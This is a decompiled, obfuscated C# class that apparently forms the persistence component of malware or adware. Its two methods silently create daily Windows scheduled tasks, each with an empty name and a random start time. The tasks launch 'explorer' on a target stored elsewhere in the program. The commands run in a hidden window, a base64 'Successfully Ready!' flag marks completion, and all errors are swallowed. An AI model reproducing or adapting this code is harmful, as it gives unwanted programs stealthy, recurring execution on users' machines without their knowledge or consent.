using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns14;
using ns21;

namespace ns19;

public class GClass18
{
	private static object object_0;

	private static object object_1;

	private static string string_0 = "";

	private static object object_2 = string_0;

	private static string[] string_1 = new string[1] { string_0 };

	private static string string_2 = "explorer";

	public static void smethod_0()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_10("o1"), (string)null, false) == 0)
			{
				Random random = new Random();
				int num = random.Next(1, 1440);
				DateTime dateTime = DateTime.Today.AddMinutes(num);
				_ = dateTime.Hour + ":" + dateTime.Minute;
				string text = dateTime.ToString("HH:mm");
				VBMath.Randomize();
				int num2 = 1;
				int num3;
				do
				{
					num3 = (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)num2) + 1f);
					num2++;
				}
				while (num2 <= 3);
				object_0 = string_1[(int)Math.Round(VBMath.Rnd() * (float)(string_1.Length - 1))];
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /st \"" + text + "\" /sc daily /mo \"" + Conversions.ToString(num3) + "\"  /tn  \""), object_0), (object)"\" /tr \"'"), (object)string_2), (object)"'"), (object)GClass20.string_51), (object)"\"")), (AppWinStyle)0, false, -1);
				Class0.smethod_11("o1", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_10("o2"), (string)null, false) == 0)
			{
				Random random = new Random();
				int num = random.Next(1, 1440);
				DateTime dateTime = DateTime.Today.AddMinutes(num);
				_ = dateTime.Hour + ":" + dateTime.Minute;
				string text = dateTime.ToString("HH:mm");
				VBMath.Randomize();
				int num2 = 4;
				int num3;
				do
				{
					num3 = (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)num2) + 1f);
					num2++;
				}
				while (num2 <= 7);
				object_1 = string_1[(int)Math.Round(VBMath.Rnd() * (float)(string_1.Length - 1))];
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /st \"" + text + "\" /sc daily /mo \"" + Conversions.ToString(num3) + "\"  /tn  \""), object_1), (object)"\" /tr \"'"), (object)string_2), (object)"'"), (object)GClass20.string_52), (object)"\"")), (AppWinStyle)0, false, -1);
				Class0.smethod_11("o2", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
